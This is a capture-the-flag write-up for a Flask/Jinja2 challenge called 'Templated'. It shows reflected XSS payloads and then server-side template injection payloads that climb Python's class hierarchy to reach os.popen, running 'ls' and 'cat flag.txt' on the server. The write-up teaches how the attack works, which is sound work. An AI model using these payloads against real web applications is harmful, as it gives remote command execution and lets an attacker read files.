# Templated

> Upon accessing the web instance, we will see this interface

```
Site still under construction
Proudly powered by Flask/Jinja2
```
The message already informs us that the page is built using Flask / Jinja2.

To test this further, I will introduce routes in the url.

I got a `404` error but notice what we entered as path in URL is getting rendered in the website. Here are a few `XSS` payloads.

```
<script>alert("hello")</script>
```
If you try this pyload, you will not get any results.

But the following pyload is executed :

```
<img src=! onerror="alert('hello')">
```

# Server Side Template Injection (SSTI)

As a result, we know that the web is vulnerable to `XSS` payloads, but this did not lead us to the flag.

Assuming that the challenge is titled `Templated` and that `Jinja2` is a web template engine for Python.

There might be a vulnerability related to `SSTI` (`Server Side Template Injection`).

Payload : `{{46+46}}`

Output  : it give `92` as output

Currently 2 vulnerabilities have been found, `SSTI` and `XSS` (`Reflected`)

Here is an article regarding SSTI problems with [Flask and Jinja](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)

By using `__mro__ ` or `mro()` in Python, we can go back up the tree of inherited objects.

We can use the `MRO` function to display classes with the following payload

```
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
```

The list shows all the files, and guess what we can see is `flag.txt`. Now we just need to replace `ls *` with `cat flag.txt`.

```
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```

We have finally obtained the flag. (^!^)
